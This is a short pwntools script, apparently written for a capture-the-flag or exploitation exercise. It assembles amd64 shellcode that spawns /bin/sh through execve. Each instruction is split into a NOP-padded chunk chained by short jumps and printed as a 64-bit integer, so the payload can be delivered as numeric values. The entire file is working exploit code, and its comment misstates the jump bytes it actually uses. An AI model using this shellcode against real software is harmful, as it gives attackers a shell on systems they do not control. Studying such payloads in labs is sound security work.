from pwn import *
context.arch='amd64'

shellcode = [
			 "push 0x68",
	     	 "mov eax, 0x732f2f2f",
	     	 "shl rax, 32",
	     	 "add rax, 0x6e69622f",
	     	 "push rax",
	     	 "mov rdi, rsp",
	     	 "push 0x6873",
	     	 "xor esi, esi",
	     	 "push rsi",
	     	 "push 8",
	     	 "pop rsi",
	     	 "add rsi, rsp",
	     	 "push rsi",
	     	 "mov rsi, rsp",
	     	 "xor edx, edx",
	     	 "push SYS_execve",
	     	 "pop rax",
	     	 "syscall"
	     	]

for code in shellcode:
	bytes = asm(code).ljust(6, b'\x90') + b'\xEB\xEB'	# \xEB\xE9: jmp short ptr -23
	print(u64(bytes))
